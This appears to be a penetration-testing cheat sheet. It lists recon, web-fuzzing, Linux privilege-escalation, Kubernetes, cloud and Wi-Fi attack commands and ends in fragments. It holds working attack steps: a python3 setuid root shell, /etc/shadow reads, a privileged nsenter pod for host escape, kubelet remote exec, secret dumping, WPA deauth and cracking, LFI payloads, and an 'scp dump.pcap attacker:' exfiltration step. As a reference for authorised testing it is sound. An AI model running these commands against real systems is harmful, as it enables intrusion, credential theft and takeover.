Methodology & Workflow Overview

Penetration Testing Methodology - Practical Overview

A structured methodology keeps the assessment consistent, repeatable, and complete. While techniques and tools change across environments, the core workflow remains similar. This section outlines the high-level flow used in real-world engagements.

1. Reconnaissance

  • Map attack surface (domains, subdomains, IP ranges)
  • Identify exposed services & technologies
  • Collect OSINT, historical URLs, DNS data, cloud assets

2. Enumeration

  • Fingerprint services, frameworks, versions
  • Discover directories, APIs, endpoints
  • Enumerate users, internal paths, protocols

3. Vulnerability Identification

  • OWASP Testing Guide techniques
  • Misconfigurations, insecure defaults, weak permissions
  • Logic flaws, authentication & session flaws

4. Exploitation

  • Input abuse, injection, auth bypass
  • Service-specific attacks (web, AD, infrastructure)
  • Credential attacks, session hijacking, deserialization

5. Post-Exploitation

  • Privilege escalation (Windows/Linux)
  • Lateral movement (AD / internal networks)
  • Credential harvesting, token manipulation, persistence

6. Reporting & Evidence

  • Document findings clearly with reproduction steps
  • Show impact and real risk
  • Provide practical remediation guidance

1. Recon & Enumeration

Nmap - Network mapper for port scanning and service enumeration.

Target Specification

  • Scan a single IP: nmap 192.168.1.1
  • Scan specific IPs: nmap 192.168.1.1 192.168.2.1
  • Scan a range: nmap 192.168.1.1-254
  • Scan a domain: nmap scanme.nmap.org
  • Scan using CIDR: nmap 192.168.1.0/24
  • Scan targets from a file: nmap -iL targets.txt
  • Scan random hosts: nmap -iR 100
  • Exclude listed hosts: nmap -exclude 192.168.1.1

Nmap Scan Techniques

  • TCP SYN scan (Default): nmap 192.168.1.1 -sS
  • TCP connect scan: nmap 192.168.1.1 -sT
  • UDP port scan: nmap 192.168.1.1 -sU
  • TCP ACK port scan: nmap 192.168.1.1 -sA
  • TCP Window port scan: nmap 192.168.1.1 -sW
  • TCP Maimon port scan: nmap 192.168.1.1 -sM

Host Discovery

  • No Scan (List targets only): nmap 192.168.1.1-3 -sL
  • Disable port scanning (Host discovery only): nmap 192.168.1.1/24 -sn
  • Disable host discovery (Port scan only): nmap 192.168.1.1-5 -Pn
  • TCP SYN discovery on port x: nmap 192.168.1.1-5 -PS22-25,80
  • TCP ACK discovery on port x: nmap 192.168.1.1-5 -PA22-25,80
  • UDP discovery on port x: nmap 192.168.1.1-5 -PU53
  • ARP discovery on local network: nmap 192.168.1.1-1/24 -PR
  • Never do DNS resolution: nmap 192.168.1.1 -n

Port Specification

  • Port scan for port x: nmap 192.168.1.1 -p 21
  • Port range: nmap 192.168.1.1 -p 21-100
  • Scan multiple TCP/UDP ports: nmap 192.168.1.1 -p U:53,T:21-25,80
  • Scan all ports: nmap 192.168.1.1 -p-
  • Port scan from service name: nmap 192.168.1.1 -p http,https
  • Fast port scan (100 ports): nmap 192.168.1.1 -F
  • Scan top x ports: nmap 192.168.1.1 -top-ports 2000
  • Leaving off initial port in range: nmap 192.168.1.1 -p-65535
  • Leaving off end port in range: nmap 192.168.1.1 -p0-

Service and Version Detection

  • Service version detection: nmap 192.168.1.1 -sV
  • Set version intensity (0-9): nmap 192.168.1.1 -sV -version-intensity 8
  • Light mode (Faster): nmap 192.168.1.1 -sV -version-light
  • Intensity level 9 (Slower): nmap 192.168.1.1 -sV -version-all
  • Enable OS detection, version detection, script scanning, and traceroute: nmap 192.168.1.1 -A

OS Detection

  • Remote OS detection: nmap 192.168.1.1 -O
  • OS detection with limited open/closed ports: nmap 192.168.1.1 -O -osscan-limit
  • Aggressive OS guessing: nmap 192.168.1.1 -O -osscan-guess
  • Set maximum OS detection tries: nmap 192.168.1.1 -O -max-os-tries 1
  • Enable OS detection, version detection, script scanning, and traceroute: nmap 192.168.1.1 -A

Timing and Performance

  • Paranoid (IDS evasion): nmap 192.168.1.1 -T0
  • Sneaky (IDS evasion): nmap 192.168.1.1 -T1
  • Polite (less bandwidth/resource usage): nmap 192.168.1.1 -T2
  • Normal (default speed): nmap 192.168.1.1 -T3
  • Aggressive (fast/reliable network): nmap 192.168.1.1 -T4
  • Insane (extraordinarily fast network): nmap 192.168.1.1 -T5

Timing and Performance Switches

  • Timeout after x: nmap 192.168.1.1 -host-timeout 1s
  • Specify RTT time: nmap 192.168.1.1 -min-rtt-timeout 1s
  • Parallel host scan group sizes: nmap 192.168.1.1 -scan-delay 1s

    • NSE Scripts

    • List all available scripts: nmap --script-help=
    • Run a specific script: nmap --script script_name
    • Run multiple scripts: nmap --script script1,script2
    • Use a script category: nmap --script category

    Firewall/IDS Evasion Techniques

    • Fragment packets: nmap -f
    • Use a decoy: nmap -D RND:10
    • Use a spoofed IP address: nmap -S 192.168.1.100
    • Randomize target order: nmap --randomize-hosts
    • Change source port: nmap --source-port 53
    • Idle scan (stealth scan): nmap -sI 192.168.1.100
RustScan

RustScan - Lightning-fast port scanner

RustScan is a modern ultra-fast port scanner that feeds discovered open ports directly into Nmap. It replaces slow “full-range” Nmap scans with a two-step workflow: RustScan for speed → Nmap for deep service enumeration.

When to use

  • Full port sweep (1–65535) in seconds
  • Before running targeted Nmap scans
  • On CTF/HTB/TryHackMe boxes where speed matters
  • To bypass noisy IDS signatures triggered by slow scans

Basic full scan

rustscan -a <IP>

Auto-detects open ports and prints them instantly.

Full scan with Nmap follow-up

rustscan -a <IP> -- -sV -sC

Everything after -- is passed directly to Nmap. This is the standard workflow: fast port discovery → version + default scripts.

Aggressive enumeration (fastest practical workflow)

rustscan -a <IP> --ulimit 5000 -- -A -sC -sV -oN scan.txt
  • --ulimit 5000 → increases open file handles, faster threading
  • -A → Nmap OS detection + traceroute + scripts
  • -oN scan.txt → save output

Specify custom port range

rustscan -a <IP> -r 1-20000

Show only open ports (silent mode)

rustscan -a <IP> --quiet

Fastest mode (unstable but extremely quick)

rustscan -a <IP> --ulimit 10000 -b 4500
  • -b → batch size. Large batches = faster, more aggressive.

Run with a custom script

rustscan -a <IP> -- -sC

Combine RustScan output with your own Nmap profile

rustscan -a <IP> -- -Pn -sV -sC --script vuln

Export open ports to a file

rustscan -a <IP> --scripts none --accessible > ports.txt

Practical workflow example


# Step 1 - Find all open ports fast
rustscan -a 10.10.10.5 --ulimit 5000 -- -sV -sC -oN rustscan_results.txt

# Step 2 - Deep scan only relevant ports
nmap -p <OPEN_PORTS> -A -sV -T4 10.10.10.5 -oN nmap_deep.txt

Why RustScan is used

  • Massively faster than Nmap's port discovery
  • Better for lab machines, boxes that reset connections, and high-latency networks
  • Easy to pipeline into automated recon frameworks

Troubleshooting

  • Missing ports? Lower batch size: -b 1000
  • Hanging? Increase timeout: --timeout 1500
  • Got rate-limited? Use: --scan-order=Random
Masscan

Masscan - Internet-scale asynchronous port scanner

Masscan is the fastest port scanner available. It can scan the entire IPv4 internet in minutes. It uses its own TCP/IP stack and sends raw packets, which makes it extremely fast but also easy to break firewalls or trigger bans. Use it carefully on internal networks.

When to use

  • Full 1–65535 port sweep at maximum speed
  • Large subnets / fast recon phases
  • Finding unexpected external exposure (shadow IT)
  • Before feeding discovered ports into Nmap
  • When RustScan still isn't fast enough

Basic full-range scan

masscan -p1-65535 <IP> --rate 10000
  • --rate controls packets per second (MUST be set)

Scan a subnet

masscan 10.10.0.0/16 -p1-65535 --rate 50000

Scan top 100 ports

masscan -p top100 <IP> --rate 20000

Scan a specific port

masscan -p80,443 10.10.10.0/24 --rate 5000

Output to a file

masscan -p1-65535 <IP> --rate 10000 -oX masscan.xml
masscan -p1-65535 <IP> --rate 10000 -oL results.list

Feed results to Nmap

masscan -p1-65535 <IP> --rate 20000 -oG masscan.grep

Then:

ports=$(grep -oP '\d+/open' masscan.grep | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -p${ports} -sV -sC <IP>

Aggressive high-speed scan

masscan -p1-65535 <IP> --rate 500000 --randomize-hosts
  • --randomize-hosts avoids sequential scanning pattern
  • High risk on corporate networks → IDS will scream

Scan using specific network interface

masscan -e eth0 -p1-65535 10.0.0.0/24 --rate 20000

Scan with source port and spoofed IP

Useful when bypassing simple ACLs:

masscan -p445 10.10.10.0/24 --rate 15000 --source-port 53
masscan -p443 172.16.1.0/24 --rate 20000 --spoof-ip 8.8.8.8

Scan IPv6 (limited)

masscan -p80 [2001:db8::/64] --rate 5000

Practical workflow (fastest)


# Step 1 - Discover all open ports with maximum speed allowed
masscan -p1-65535 10.10.11.5 --rate 40000 -oG masscan.grep

# Step 2 - Extract only the open ports
ports=$(grep -oP '\d+/open' masscan.grep | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')

# Step 3 - Run deep Nmap on the discovered ports
nmap -p${ports} -A -sC -sV 10.10.11.5 -oN nmap_deep.txt

Notes for real-world PT

  • Rate too high will drop packets → missing ports
  • Rate too low wastes Masscan's advantage
  • Firewalls may blacklist you after 1–2 seconds
  • You must run as root because Masscan crafts raw packets
  • Never run Masscan on external IPs without permission

Troubleshooting

  • Missing ports? Lower rate: --rate 5000
  • Scan stuck? Use --router-ip <GW>
  • Permission denied? Needs root (uses raw sockets)
  • Host unreachable? NIC selection with -e <interface>

Subfinder

Subfinder - Passive Subdomain Enumeration

Subfinder is a fast, reliable passive subdomain enumeration tool by ProjectDiscovery. It collects subdomains from dozens of passive data sources (certificates, APIs, DNS datasets) without sending active brute-force traffic. This makes it ideal for stealth and wide-scope recon.

When to use

  • Stealth subdomain enumeration with zero noise
  • Large-scope recon for bug bounties
  • Before running brute-force tools like dnsx or gobuster
  • To expand the attack surface without alerting blue team
  • When you need clean, passive-only results

Basic usage

subfinder -d example.com

Fast, passive enumeration using all default providers.

Save results to a file

subfinder -d example.com -o subdomains.txt

Use maximum providers (aggressive passive)

subfinder -d example.com -all -o all.txt

Only use specific sources

subfinder -d example.com -sources crtsh,ipv4info,wayback

Exclude noisy or rate-limited providers

subfinder -d example.com -exclude alienvault,virustotal

Enumerate multiple domains in bulk

subfinder -dL domains.txt -o output.txt

Each domain in domains.txt gets scanned automatically.

Pipe Subfinder → dnsx to verify live DNS

subfinder -d example.com | dnsx -resp

Ensures returned subdomains actually resolve.

Pipe Subfinder → HTTP probe

subfinder -d example.com | httpx -title -status -tech-detect

Quickly turns passive subs into web targets.

Combine multiple enumeration tools


(
  subfinder -d example.com
  amass enum -passive -d example.com
) | sort -u | dnsx -resp

Authenticated API key mode

Some providers (VT, Shodan, Censys) require keys in ~/.config/subfinder/config.yaml:


resolvers:
  - 1.1.1.1
  - 8.8.8.8

sources:
  shodan:
    - key: SHODAN_API_KEY
  censys:
    - id: CENSYS_ID
      secret: CENSYS_SECRET

After adding keys, rerun:

subfinder -d example.com -all

Stealth mode: avoid noisy sources

subfinder -d example.com -silent -nW
  • -silent → raw output only
  • -nW → no wildcard DNS checks

Fastest practical recon workflow


# Step 1 - Collect passive subdomains
subfinder -d example.com -all -silent -o subs.txt

# Step 2 - DNS validate results
dnsx -l subs.txt -resp -o alive.txt

# Step 3 - Identify web targets
httpx -l alive.txt -title -tech-detect -status -o web_targets.txt

Notes for real PT

  • Subfinder is passive → no brute-force → low detection
  • With API keys, results improve dramatically
  • Pipe results into dnsx or httpx for actionable targets
  • Used heavily in large bug bounty programs
  • Often combined with Amass for maximum coverage

Troubleshooting

  • Missing subs? Add -all and API keys
  • Rate-limited? Remove noisy sources: -exclude alienvault
  • Duplicates? Pipe into sort -u
httprobe

httprobe - Fast HTTP/HTTPS liveness checker

httprobe takes a list of domains or hosts and checks which ones respond over HTTP or HTTPS. It's extremely useful after subdomain enumeration (Subfinder, Amass, Assetfinder) to filter the list to only “live” web hosts.

When to use

  • Immediately after Subfinder / Amass to identify real web targets
  • To expand attack surface quickly before crawling or fuzzing
  • To identify which subdomains respond on SSL or plain HTTP
  • To feed live web hosts into ffuf, gobuster, nuclei, or Burp
  • Cleans massive recon noise in seconds

Basic usage (probe HTTP & HTTPS)

cat subs.txt | httprobe

Returns only hosts that respond on port 80 or 443.

Probe only HTTPS

cat subs.txt | httprobe -s
  • -s → force HTTPS only

Probe non-standard ports

cat subs.txt | httprobe -p http:8080 -p https:8443

Add thread concurrency

cat subs.txt | httprobe -c 50
  • -c → number of concurrent probes

Strip duplicate protocols

cat subs.txt | httprobe -prefer-https

If both HTTP and HTTPS are alive, only return the HTTPS version.

Save results to file

cat subs.txt | httprobe > live_hosts.txt

Use httprobe directly after Subfinder

subfinder -d example.com -silent | httprobe > alive.txt

Use httprobe with Amass

amass enum -passive -d example.com | httprobe > alive.txt

Chain httprobe → ffuf for instant fuzzing


subfinder -d example.com -silent \
  | httprobe \
  | ffuf -u FUZZ -w wordlist.txt

Chain httprobe → Nuclei for vulnerabilities

cat subs.txt | httprobe | nuclei -t cves/ -o nuclei_output.txt

Probe with timeout control

cat subs.txt | httprobe -t 3000
  • -t → timeout per probe in milliseconds

Resolve IPs before probing

Useful when hosts do not respond to DNS queries:

cat hosts.txt | mapcidr -silent | httprobe

Practical workflow


# Step 1 - Gather all subs
subfinder -d example.com -silent -o subs.txt

# Step 2 - Probe for live hosts
cat subs.txt | httprobe -prefer-https > alive.txt

# Step 3 - Fingerprint technology stack
httpx -l alive.txt -tech-detect -title -status -o tech.txt

Real-world notes

  • httprobe is purely a liveness checker → no metadata
  • Most recon pipelines: subfinder → httprobe → httpx
  • Prefer https output when available for cleaner testing
  • Very stable for large recon sets (10k–200k subdomains)
  • Faster and lighter than running curl in bulk

Troubleshooting

  • Too many false-positives? Use httpx -mc 200 after httprobe
  • Slow? Increase threads: -c 100
  • Missing some hosts? Add ports manually: -p http:8080

2. Web Exploitation

Burp Suite

Burp Suite - Web Application Attack Platform

Burp Suite is the central tool for manual and semi-automated web exploitation. It handles interception, modification, scanning, fuzzing, credential attacks, client-side manipulation, API recon, and automation via extensions. The value of Burp is not the GUI - it's how fast you can identify and attack HTTP request/response behavior.

Core workflow

  1. Set browser proxy → Intercept target traffic
  2. Send important requests to Repeater
  3. Send parameter-heavy endpoints to Intruder
  4. Spider/Discover hidden paths via Target tab
  5. Active/Passive scan (Pro) for vulnerabilities
  6. Use extensions for automation (Turbo Intruder, Param Miner, etc.)

Proxy

Typical setup


Proxy → Options → Add:
    127.0.0.1:8080
Then install Burp CA cert in browser.

Main usage

  • Intercept login flow, token issuance, API calls
  • Modify headers, params, cookies on the fly
  • Discover hidden params by forcing weird inputs
  • Replay request chains

Key proxy manipulations


Add/Remove Cookie
Add X-Forwarded-For: 127.0.0.1
Inject payloads into JSON/XML bodies
Rewrite Host header for virtual host attacks
Force HTTP/1.0 downgrade

Repeater

Where you manually craft and test attack payloads.

When to use

  • SQL injection, XSS, SSTI, LFI path testing
  • JWT manipulation (alg confusion / NONE / kid)
  • Header poisoning tests
  • IDOR and access control abuse
  • Race-condition planning

Core techniques


Send → Repeater
Try different verbs: POST → GET → HEAD → OPTIONS
Rewrite JSON fields or append unexpected items
Insert unicode, null bytes, or whitespace attacks

FFUF

FFUF - Fast Web Fuzzer

FFUF (Fuzz Faster U Fool) is one of the fastest and most flexible HTTP fuzzers. It handles directory brute-force, virtual host discovery, parameter mining, API endpoint fuzzing, recursion, and response pattern filtering.

When to use

  • Directory/file bruteforce
  • Hidden parameter discovery
  • VHost enumeration
  • API endpoint fuzzing
  • Finding LFI paths, IDOR variants, and filter bypasses
  • Content discovery on large web apps

1. Basic directory fuzzing

ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

Fuzz with filtering (recommended)

ffuf -u https://target.com/FUZZ -w common.txt -fc 404
  • -fc → filter by HTTP code

Filter by response size

ffuf -u https://target.com/FUZZ -w common.txt -fs 0

Match by response code

ffuf -u https://target.com/FUZZ -w common.txt -mc 200,301

2. File extension fuzzing

ffuf -u https://target.com/indexFUZZ -w ext.txt -mc 200

Typical ext list: php,asp,aspx,js,txt,bak,old

Directory + extension

ffuf -u https://target.com/FUZZ -w common.txt -e .php,.txt,.bak

3. Virtual Host fuzzing

ffuf -u http://target/ -w hosts.txt -H "Host: FUZZ.target.com" -fc 302,400

Wildcard detection tip

First capture the baseline response size, then filter out identical lengths: 

ffuf -u http://target/ -w hosts.txt -H "Host: FUZZ" -fs <baseline_size>

4. GET parameter fuzzing

ffuf -u "https://target.com/?FUZZ=test" -w params.txt -mc 200

POST parameter fuzzing


ffuf -u https://target.com/login \
     -w params.txt \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "FUZZ=aaa&password=bbb"

Value fuzzing


ffuf -u "https://target.com/?id=FUZZ" \
     -w numbers.txt \
     -mc 200

Multiple fuzzing points


ffuf -u "https://target.com/FUZZ?id=FUZ2" \
     -w words.txt:FUZZ \
     -w numbers.txt:FUZ2

5. API endpoint fuzzing


ffuf -u "https://api.target.com/FUZZ" \
     -w apis.txt \
     -H "Authorization: Bearer TOKEN"

JSON body fuzzing


ffuf -u https://api.target.com/search \
     -w payloads.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"query":"FUZZ"}'

6. LFI fuzzing


ffuf -u "https://target.com/?file=FUZZ" \
     -w lfi_paths.txt \
     -mc 200

Common LFI payloads list

  • /etc/passwd
  • /proc/self/environ
  • ../../../../../../windows/win.ini
  • php://filter/convert.base64-encode/resource=index.php

7. IDOR Testing

Numeric ID fuzzing


ffuf -u "https://target.com/user?id=FUZZ" \
     -w numbers.txt \
     -mc 200

Non-sequential IDs


ffuf -u "https://target.com/order/backup-FUZZ" \
     -w tokens.txt \
     -mc 200

8. Header fuzzing

Find hidden features via headers

Linux Capabilities

Linux Capabilities - Privilege Escalation via Misconfigured Binaries

Linux capabilities break the all-or-nothing root privilege model by assigning specific permissions (capabilities) to individual binaries. When misconfigured, these binaries allow **partial or full root privilege escalation**.

When to use

  • After initial access to a Linux box
  • To find binaries with elevated privileges but not SUID
  • To escalate using dangerous capabilities (e.g., cap_setuid, cap_dac_read_search)
  • To read files, bind to privileged ports, or spawn shells as root

1. Enumerate capabilities

List all files with capabilities

getcap -r / 2>/dev/null

Check capabilities of a specific binary

getcap /path/to/binary

Common dangerous capabilities

  • cap_setuid+ep - allows changing UID → full root
  • cap_setgid+ep - change group ID
  • cap_dac_read_search+ep - read ANY file
  • cap_sys_admin+ep - basically root (mount, pivot, etc.)
  • cap_net_bind_service+ep - bind to ports <1024
  • cap_chown+ep - change ownership of files

2. Privilege escalation via capabilities

A. cap_setuid+ep → full root shell

If any binary has cap_setuid, you can force-set UID=0.


# Example: python3 with cap_setuid
getcap /usr/bin/python3
# => cap_setuid+ep

/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Instant root.

B. cap_dac_read_search+ep → read ANY file

This bypasses file permissions completely.


# Example: tar with cap_dac_read_search
tar cvf /tmp/shadow.tar /etc/shadow

Or with python:


python3 -c 'print(open("/etc/shadow").read())'

C. cap_sys_admin+ep → near-root capabilities

  • mount filesystems
  • pivot_root
  • create namespaces
  • chroot escapes
  • load FUSE modules

Exploit example: mount host filesystem and change root password.


mount -o bind / /mnt
chroot /mnt /bin/bash
# full root

D. cap_net_bind_service+ep → bind privileged ports

Not a direct root exploit, but useful for persistence or replacing legitimate services. 

python3 -c 'import socket as s; sock=s.socket(); sock.bind(("0.0.0.0",80))'

E. cap_chown+ep → change file ownership

Turn any file into yours, then escalate.

chown hacker:hacker /etc/shadow

Then modify shadow → root.

3. How attackers abuse incorrect capability assignments

Admins incorrectly run:

setcap cap_setuid+ep /usr/bin/python3

or:

setcap cap_dac_read_search+ep /usr/bin/tar

This gives **massive unintended privilege** to unprivileged users and is extremely common in misconfigured environments.

4. Removing capabilities (for defense)

sudo setcap -r /usr/bin/python3

5. Common binaries found vulnerable

  • python, python3
  • node
  • tar
  • perl
  • openssl
  • capsh
  • bash
  • tcpdump (often cap_net_admin)

tcpdump - CLI Packet Sniffer for Network Recon & Exploitation

tcpdump captures raw network traffic directly from interfaces. It's used for recon, credential interception, protocol inspection, malware traffic capture, and identifying vulnerable services during infrastructure PT.

When to use

  • Capturing traffic for offline analysis (Wireshark)
  • Sniffing credentials over HTTP/FTP/SMTP
  • Man-in-the-middle monitoring
  • Inspecting DNS, DHCP, SMB, Kerberos activity
  • Checking for C2 traffic or beaconing
  • Network pivot testing inside compromised environments

1. Basic capture

tcpdump -i eth0

Capture with readable output

tcpdump -i eth0 -vvv -n

Capture to file (pcap)

tcpdump -i eth0 -w capture.pcap

Read pcap file

tcpdump -r capture.pcap

2. Filters (core skill)

By host

tcpdump host 10.10.10.5

By source or destination

tcpdump src 192.168.1.10
tcpdump dst 192.168.1.10

By port

tcpdump port 80

By protocol

tcpdump udp
tcpdump tcp

Combine filters

tcpdump tcp and port 80 and host 10.10.10.5

3. Credential capture examples

HTTP passwords

tcpdump -i eth0 -A -s 0 'tcp port 80'

FTP creds

tcpdump -i eth0 -A 'port 21'

SMTP (clear-text logins)

tcpdump -i eth0 -A 'port 25 or port 587'

4. DNS monitoring

tcpdump -i eth0 port 53

Show only DNS queries

tcpdump -vvv -n -i eth0 udp port 53

5. Security monitoring usage

Look for beaconing / C2 intervals

tcpdump -i eth0 -nn -tttt -v

Identify ARP spoofing

tcpdump -n -e arp

Inspect Kerberos traffic

tcpdump port 88

SMB traffic

tcpdump port 445

6. Real PT workflow


# Step 1 - Identify active interface
ip a

# Step 2 - Capture traffic
tcpdump -i eth0 -w dump.pcap

# Step 3 - Exfiltrate
scp dump.pcap attacker:

# Step 4 - Analyze in Wireshark
wireshark dump.pcap

7. Troubleshooting

  • No packets? Wrong interface → check “ip link”
  • Permission denied? Need root or capabilities
  • Too much noise? Add filters
  • Missing payload? Add -s 0 to capture full packets
Wireshark

Wireshark - Full GUI Packet Analysis for Pentesting

Wireshark is the main GUI tool for analyzing packets, reversing network protocols, extracting credentials, inspecting malware C2 traffic, and analyzing pcap captures. Essential for both network exploitation and incident analysis.

When to use

  • To analyze captured packets from tcpdump
  • To extract credentials from plaintext protocols
  • To analyze DNS, Kerberos, SMB, LDAP activity
  • To reverse engineer traffic (custom protocols)
  • To detect suspicious or C2-like traffic patterns
  • To reconstruct files from packet streams

kubectl

kubectl - Kubernetes Command Line for Cluster Enumeration & Abuse

kubectl is the main CLI to interact with Kubernetes clusters. During cloud / container penetration tests, kubectl is used to enumerate namespaces, pods, service accounts, secrets, RBAC permissions, network policies, and to abuse misconfigured privileges for container breakout or cluster takeover.

When to use

  • After obtaining kubeconfig, service account token, or API access
  • To enumerate pods, secrets, roles, bindings, cluster roles
  • To run commands inside containers (exec)
  • To read secrets when RBAC is misconfigured
  • To spawn privileged pods for container escape
  • To pivot inside the cluster

1. Identify cluster & your permissions

Check API server connectivity

kubectl version --short

View current identity

kubectl config view

Check your effective permissions

kubectl auth can-i --list

2. Cluster enumeration

Namespaces

kubectl get ns

Pods

Services

kubectl get svc -A

Deployments

kubectl get deployments -A

Ingress rules

kubectl get ingress -A

ConfigMaps

kubectl get configmaps -A

kubectl get secrets -A

If you can list secrets → likely cluster compromise.

3. Dumping secrets

Dump all secrets in a namespace


kubectl get secrets -n default -o jsonpath='{.items[*].data}'

Decode a specific secret


kubectl get secret my-secret -o jsonpath='{.data.password}' | base64 -d

Dump service account tokens


kubectl get secrets -A | grep token

4. RBAC enumeration & exploitation

List roles

kubectl get roles -A

List rolebindings

kubectl get rolebindings -A

List cluster roles

kubectl get clusterroles

Check if user can create pods

kubectl auth can-i create pods

Check if user can escalate privileges

kubectl auth can-i '*' '*' --all-namespaces

If yes → full cluster compromise.

5. Execute commands inside containers

Interactive shell


kubectl exec -it PODNAME -- /bin/bash

List environment variables


kubectl exec PODNAME -- env

Often contains DB passwords, API keys, internal URLs.

6. Privileged pod & container escape

If you can create pods


kubectl run pwned --image=alpine \
--overrides='{
  "apiVersion": "v1",
  "spec": {
    "hostPID": true,
    "hostIPC": true,
    "hostNetwork": true,
    "containers": [{
      "name": "alpine",
      "image": "alpine",
      "securityContext": { "privileged": true },
      "command": ["nsenter", "--target=1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "sh"]
    }]
  }
}'

You now have host-level shell → node compromise.

7. Service account token abuse

View token path inside container

ls /var/run/secrets/kubernetes.io/serviceaccount/

Extract token


cat /var/run/secrets/kubernetes.io/serviceaccount/token

Use token directly against API


curl -k -H "Authorization: Bearer TOKEN" \
https://K8S_API/api

If SA has high privileges → cluster compromise.

8. Kubelet exploitation

List running pods via kubelet (unauthenticated on old clusters)


curl -k https://NODE_IP:10250/pods

Exec into pod via kubelet


curl -k -XPOST "https://NODE_IP:10250/run///" \
-d "cmd=id"

If kubelet is open → full node takeover.

9. Practical pentest workflow


# Step 1 - Gain credentials or SA token
kubectl config view

# Step 2 - Enumerate cluster
kubectl get pods -A -o wide
kubectl get secrets -A
kubectl get roles -A

# Step 3 - Check RBAC abuse paths
kubectl auth can-i create pods

# Step 4 - Dump secrets & configmaps
kubectl get secrets -A

# Step 5 - Spawn privileged pod for breakout

10. Troubleshooting

  • “Forbidden” errors → RBAC restrictions; try another namespace
  • “No such resource” → missing API version; run kubectl api-resources
  • Token invalid → expired; extract new token from inside pod
  • Pod creation denied → check rolebindings for privilege escalation
CloudSploit

CloudSploit - Cloud Misconfiguration Scanner (AWS/Azure/GCP)

CloudSploit is a scanning toolkit that checks cloud environments for weak configurations: excessive permissions, exposed storage buckets, open security groups, MFA issues, KMS misconfigurations, IAM role misuse, insecure logging setups, and more. It can run directly via CLI, Docker, or SaaS.

When to use

  • During cloud penetration tests and cloud audits
  • After gaining cloud credentials (AWS keys / Azure token / GCP creds)
  • To quickly map risky configurations and exploitable attack paths
  • To detect public S3 buckets, IAM privilege escalation paths, open databases
  • To identify missing logging or monitoring for stealth attack routes

1. Installation / Running

Docker (recommended)


docker run --rm \
  -e AWS_ACCESS_KEY_ID=AKIA... \
  -e AWS_SECRET_ACCESS_KEY=abcd... \
  cloudsploit/cloudsploit

NodeJS (local)


git clone https://github.com/aquasecurity/cloudsploit.git
cd cloudsploit
npm install
node index.js --help

2. AWS Scan


node index.js --scan aws --json > aws_report.json

Run for specific services


node index.js --scan aws --services s3,ec2,iam

3. Common exploitable AWS findings

S3 (Storage)

  • Public buckets → arbitrary read/write
  • Bucket policy allowing "Principal": "*"
  • No encryption (AES256/KMS disabled)

EC2 / Security Groups

  • Ports 22, 3389, 3306, 5432 open to world
  • Publicly accessible metadata endpoints
  • No NACL restrictions

IAM Misconfigurations

  • Users without MFA
  • Excessive permissions (* wildcard)
  • PrivEsc possible via:
    • iam:PassRole
    • iam:CreatePolicyVersion
    • iam:AttachRolePolicy
    • lambda:UpdateFunctionCode
    • ec2:RunInstances with privileged roles
  • Long-lived access keys

CloudTrail / Logging

  • CloudTrail disabled → attacker operations invisible
  • S3 bucket logs not protected from delete
  • No GuardDuty monitoring

4. Azure & GCP Scans

Azure


node index.js --scan azure --json > azure.json
  • Storage accounts publicly readable
  • Unrestricted NSG rules
  • Exposed KeyVault secrets
  • Privileged role assignments (Owner/User Access Administrator)

GCP


node index.js --scan gcp --json > gcp.json
  • Service accounts with primitive roles (Editor/Owner)
  • Public GCS buckets
  • IAM policies with wildcard principals
  • CloudSQL instances exposed to Internet

9. Wireless / MITM

Aircrack-ng

Aircrack-ng - Wireless Attacks, WPA Cracking & Packet Capture

Aircrack-ng is the primary toolkit for Wi-Fi offensive operations: monitor mode, packet capture, deauthentication attacks, WPA handshake capture, PMKID attacks, WEP cracking, and traffic analysis.

When to use

  • Capturing WPA/WPA2 handshakes for offline cracking
  • Performing deauth attacks to force handshake generation
  • PMKID-based attacks (no clients required)
  • Network discovery in monitor mode
  • Capturing WEP IVs for cracking
  • Validating wireless segmentation and rogue AP presence

1. Enable monitor mode


airmon-ng check kill
airmon-ng start wlan0

Creates interface wlan0mon.

2. Scan for APs & clients


airodump-ng wlan0mon

Note **BSSID**, **channel**, **clients**.

3. Capture WPA handshake


airodump-ng --bssid AA:BB:CC:DD:EE:FF \
  --channel 11 \
  --write handshake wlan0mon

4. Force client reconnection (deauth)


aireplay-ng --deauth 10 -a AP_MAC -c CLIENT_MAC wlan0mon

Handshake appears in airodump: “WPA handshake: AP_MAC”.

5. PMKID attack (no clients needed)


hcxdumptool -i wlan0mon -o pmkid.pcapng --active
hcxpcapngtool -o pmkid.hccapx pmkid.pcapng

Use with hashcat mode 16800.

6. Crack handshake / PMKID

WPA handshake


aircrack-ng handshake.cap -w wordlist.txt

With Hashcat (recommended)


hashcat -m 22000 handshake.hc22000 rockyou.txt

7. WEP cracking (legacy networks)

Capture IVs


airodump-ng -c 6 --bssid AP_MAC -w wep wlan0mon

Inject traffic


aireplay-ng -3 -b AP_MAC wlan0mon

Crack


aircrack-ng wep-01.cap

8. Rogue AP detection


airodump-ng wlan0mon --wps

9. Real pentest workflow


# Step 1 - Enable monitor mode
airmon-ng start wlan0

# Step 2 - Identify AP & channel
airodump-ng wlan0mon

# Step 3 - Capture handshake
airodump-ng --bssid XX --channel X -w out wlan0mon

# Step 4 - Force reconnect
aireplay-ng --deauth 10 -a XX -c YY wlan0mon

# Step 5 - Crack offline
hashcat -m 22000 out.22000 wordlist.txt

10. Troubleshooting

  • No handshake? Force deauth or wait for client
  • Packet injection fails? Driver not supported
  • “Fixed channel” errors → kill NetworkManager
  • PMKID missing? AP uses newer firmware
mitmproxy

mitmproxy - Intercept, Modify & Replay HTTP/HTTPS Traffic

mitmproxy is a powerful interactive man-in-the-middle proxy used to inspect, manipulate, intercept, and replay HTTP/HTTPS traffic. Essential for web pentesting, mobile app assessment, API hacking, and traffic manipulation.

When to use

  • Intercepting and modifying HTTP/HTTPS requests in real time
  • Testing insecure mobile apps / APIs
  • Bypassing client-side validation
  • Replay & fuzz endpoints (mitmproxy + mitmdump)
  • Inspecting encrypted TLS traffic via custom CA
  • Testing session fixation, auth weaknesses, JWT, cookies

mitmproxy -p 8080

e → response

r
